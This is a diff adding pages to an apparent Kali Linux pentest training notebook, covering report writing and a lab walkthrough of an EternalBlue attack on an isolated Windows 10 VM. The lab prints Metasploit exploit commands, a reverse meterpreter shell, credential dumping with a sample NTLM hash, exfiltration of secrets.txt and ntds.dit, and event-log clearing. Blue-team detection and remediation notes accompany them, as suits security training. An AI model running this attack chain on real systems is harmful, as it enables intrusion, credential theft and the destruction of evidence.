+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 10 -->
+<template id="tpl-reporting">
+<article class="topic">
+  <h2>Reporting &amp; Evidence Collection</h2>
+  <p>A pentest report is the deliverable clients pay for. Quality reporting separates professional penetration testers from script kiddies. Document everything as you go — don't wait until the end.</p>
+
+  <h3>Evidence Collection During the Test</h3>
+  <pre><code># Screenshot tool (Flameshot recommended on Kali)
+flameshot gui    # interactive screen capture with annotation
+flameshot full -p ~/pentest/screenshots/   # full screen to file
+
+# Terminal logging — capture full session
+script -a ~/pentest/logs/session_$(date +%Y%m%d_%H%M).log
+# Everything you type and all output is saved
+# Exit with: exit
+
+# tmux logging (if using tmux)
+# In tmux: Ctrl+B then : → then: pipe-pane -o 'cat >>~/pentest/logs/tmux.log'
+
+# Evidence naming convention
+# [date]-[host]-[vulnerability]-[step].png
+# 20240315-192.168.56.30-ms17010-initial_access.png
+
+# Automatically timestamp all commands
+HISTTIMEFORMAT="%F %T " history</code></pre>
+
+  <h3>Note-Taking Tools</h3>
+  <table>
+    <thead><tr><th>Tool</th><th>Best For</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td>CherryTree</td><td>Structured hierarchical notes with rich text</td><td>Pre-installed on Kali; nodes and subnodes per target/vulnerability</td></tr>
+      <tr><td>Obsidian</td><td>Markdown-based, links between notes</td><td>Great for linking recon → vuln → exploit → evidence</td></tr>
+      <tr><td>Notion</td><td>Team collaboration during engagements</td><td>Cloud-based — check client data handling requirements</td></tr>
+      <tr><td>KeepNote</td><td>Simple hierarchical notebook</td><td>Pre-installed on Kali; lightweight</td></tr>
+      <tr><td>Ghostwriter</td><td>Full pentest report management</td><td>Open source; supports findings, evidence, and report generation</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Report Structure (Standard Pentest Report)</h3>
+  <table>
+    <thead><tr><th>Section</th><th>Contents</th></tr></thead>
+    <tbody>
+      <tr><td>Executive Summary</td><td>Business-level risk overview; no technical jargon; key findings in plain English; overall risk rating</td></tr>
+      <tr><td>Scope &amp; Methodology</td><td>What was tested (IPs, domains, dates), rules of engagement, testing methodology (black/grey/white box), tools used</td></tr>
+      <tr><td>Attack Narrative</td><td>Story of the engagement — how initial access was gained, how it was escalated, what could be accessed. Written for a technical reader.</td></tr>
+      <tr><td>Findings</td><td>One page per finding: CVE/title, severity (CVSS), affected systems, proof (screenshot), remediation recommendation, references</td></tr>
+      <tr><td>Risk Matrix</td><td>All findings in a table: Finding | Severity | Affected System | Status</td></tr>
+      <tr><td>Remediation Roadmap</td><td>Prioritized fix list: Critical → High → Medium → Low with suggested timelines</td></tr>
+      <tr><td>Appendices</td><td>Tool output, raw logs, full nmap output, full scan data</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Finding Severity (CVSS-based)</h3>
+  <table>
+    <thead><tr><th>Rating</th><th>CVSS Range</th><th>Example</th><th>Fix Timeline</th></tr></thead>
+    <tbody>
+      <tr><td style="color:#ff4444"><strong>Critical</strong></td><td>9.0 – 10.0</td><td>Unauthenticated RCE (EternalBlue)</td><td>Patch immediately / 24h</td></tr>
+      <tr><td style="color:#ff8800"><strong>High</strong></td><td>7.0 – 8.9</td><td>SQL injection, authenticated RCE</td><td>Within 7 days</td></tr>
+      <tr><td style="color:#ffcc00"><strong>Medium</strong></td><td>4.0 – 6.9</td><td>Stored XSS, weak cipher suites</td><td>Within 30 days</td></tr>
+      <tr><td style="color:#88cc44"><strong>Low</strong></td><td>0.1 – 3.9</td><td>Version disclosure, HTTP banner info</td><td>Within 90 days</td></tr>
+      <tr><td><strong>Informational</strong></td><td>0.0</td><td>Best practice recommendations</td><td>As budget allows</td></tr>
+    </tbody>
+  </table>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 11 -->
+<template id="tpl-lab">
+<article class="topic">
+  <h2>Investigation Lab — Full Pentest Workflow</h2>
+  <div class="callout warn">
+    <strong>Authorization required.</strong> This lab uses the isolated Host-Only VirtualBox network. No traffic reaches the internet or your production network. Never run these steps outside the lab without written authorization.
+  </div>
+
+  <h3>Lab Setup</h3>
+  <table>
+    <thead><tr><th>VM</th><th>IP</th><th>Role</th><th>Config</th></tr></thead>
+    <tbody>
+      <tr><td>Kali Linux</td><td>192.168.56.10</td><td>Attacker</td><td>Host-Only: vboxnet0; NAT for internet updates</td></tr>
+      <tr><td>Windows 10</td><td>192.168.56.30</td><td>Target</td><td>Host-Only only; SMBv1 enabled; weak admin password</td></tr>
+      <tr><td>Security Onion</td><td>192.168.56.20</td><td>Blue team observer</td><td>Sniffs Host-Only network; watches for alerts</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Phase 1 — Reconnaissance</h3>
+  <pre><code># From Kali: discover the target
+sudo arp-scan 192.168.56.0/24
+# → 192.168.56.30   XX:XX:XX:XX:XX:XX   PCS Systemtechnik GmbH (VirtualBox MAC)
+
+# Nmap full discovery
+nmap -sC -sV -O -p- 192.168.56.30 -oA lab_target --min-rate 1000
+# Results show:
+# 22/tcp   open  ssh      OpenSSH 8.x
+# 135/tcp  open  msrpc
+# 139/tcp  open  netbios-ssn
+# 445/tcp  open  microsoft-ds Windows 10
+# 3389/tcp open  ms-wbt-server (RDP)
+# Host: Windows 10 Pro, WORKGROUP</code></pre>
+
+  <h3>Phase 2 — Enumeration</h3>
+  <pre><code># SMB enumeration
+enum4linux -a 192.168.56.30 | tee enum4linux.txt
+# Look for: null session, share names, OS, users
+
+crackmapexec smb 192.168.56.30
+# Output: SMBv1:True, Signing:False, Domain:WORKGROUP
+
+# Check for EternalBlue (MS17-010)
+nmap -p445 --script smb-vuln-ms17-010 192.168.56.30
+# If vulnerable: Host is likely VULNERABLE to MS17-010!
+
+# Share access
+smbclient -L //192.168.56.30/ -N
+smbclient //192.168.56.30/Users -N</code></pre>
+
+  <h3>Phase 3 — Exploitation (EternalBlue)</h3>
+  <pre><code># Metasploit EternalBlue
+msfconsole -q
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.30
+set LHOST 192.168.56.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+# Successful output:
+# [*] Meterpreter session 1 opened (192.168.56.10:4444 → 192.168.56.30:49xxx)
+# meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM</code></pre>
+
+  <h3>Phase 4 — Post-Exploitation</h3>
+  <pre><code"># Inside meterpreter session
+meterpreter > sysinfo
+meterpreter > getpid
+meterpreter > ps            # list processes
+meterpreter > migrate 756   # migrate to a stable process (e.g., explorer.exe PID)
+
+# Dump credentials
+meterpreter > hashdump
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+# → NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c (crack or pass-the-hash)
+
+# Shell access
+meterpreter > shell
+C:\> whoami            # NT AUTHORITY\SYSTEM
+C:\> ipconfig /all     # network info
+C:\> net user          # local users
+C:\> net localgroup administrators
+
+# Download interesting files
+meterpreter > download "C:\Users\Administrator\Documents\secrets.txt" .
+meterpreter > download "C:\Windows\NTDS\ntds.dit" .    # DC only</code></pre>
+
+  <h3>Phase 5 — Blue Team Perspective (Security Onion)</h3>
+  <pre><code># On Security Onion, watch for:
+# 1. Suricata alerts:
+#    ET EXPLOIT MS17-010 EternalBlue SMB Remote Code Execution
+#    MALWARE Meterpreter (reverse_tcp)
+
+# 2. Zeek conn.log — connection to 445 followed by large payload
+#    zeek-cut ts uid id.orig_h id.resp_h id.resp_p proto conn_state orig_bytes < conn.log
+
+# 3. Zeek notice.log — SMB exploitation signatures
+# 4. Hunt KQL query for lateral movement:
+#    event.module: zeek AND network.transport: tcp AND destination.port: 445
+#    | where source.bytes > 10000 AND connection.state: "SF"
+
+# This is why defense-in-depth matters:
+# Patch MS17-010, disable SMBv1, enable Windows Defender,
+# segment networks, monitor with SIEM</code></pre>
+
+  <h3>Phase 6 — Cleanup &amp; Documentation</h3>
+  <pre><code># Inside meterpreter — clean up artifacts
+meterpreter > clearev        # clear Windows event logs (for lab only)
+meterpreter > rm C:\Temp\winpeas.exe
+meterpreter > exit
+
+# Document findings in report format:
+# Finding: MS17-010 (EternalBlue) Remote Code Execution — CRITICAL
+# System: 192.168.56.30 (Windows 10)
+# Impact: Unauthenticated SYSTEM-level access, full credential dump
+# Evidence: [screenshot of SYSTEM shell + hashdump]
+# Remediation: Apply KB4012212; disable SMBv1 via PowerShell:
+#   Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
+
+# Revert VM snapshot to clean state
+# File the lab report in your notes</code></pre>
+
+  <div class="callout lab">
+    <strong>Lab Extension Ideas:</strong> Try the same attack path against Metasploitable 2 (192.168.56.40) for Linux exploitation practice. Practice pivoting from Windows 10 to a third internal host. Set up BloodHound for Active Directory attack path mapping.
+    <a href="#" class="xref" onclick="loadTopic('postexploit'); return false;">Pivoting techniques ↗</a>
+  </div>
+</article>
+</template>
+
+<script>
+window.NOTEBOOK = {
+  title: 'Kali Linux',
+  topics: [
+    { id: 'overview',     badge: '01', label: 'Overview & Environment'     },
+    { id: 'recon',        badge: '02', label: 'Recon & OSINT'              },
+    { id: 'scanning',     badge: '03', label: 'Network Scanning'           },
+    { id: 'webapp',       badge: '04', label: 'Web App Testing'            },
+    { id: 'passwords',    badge: '05', label: 'Password & Hash Attacks'    },
+    { id: 'exploitation', badge: '06', label: 'Exploitation'               },
+    { id: 'postexploit',  badge: '07', label: 'Post-Exploitation'          },
+    { id: 'wireless',     badge: '08', label: 'Wireless Attacks'           },
+    { id: 'ctf',          badge: '09', label: 'CTF Techniques'             },
+    { id: 'reporting',    badge: '10', label: 'Reporting & Evidence'       },
+    { id: 'lab',          badge: '11', label: 'Investigation Lab'          },
+  ]
+};
+</script>
+<script src="js/app.js"></script>
+</body>
+</html>
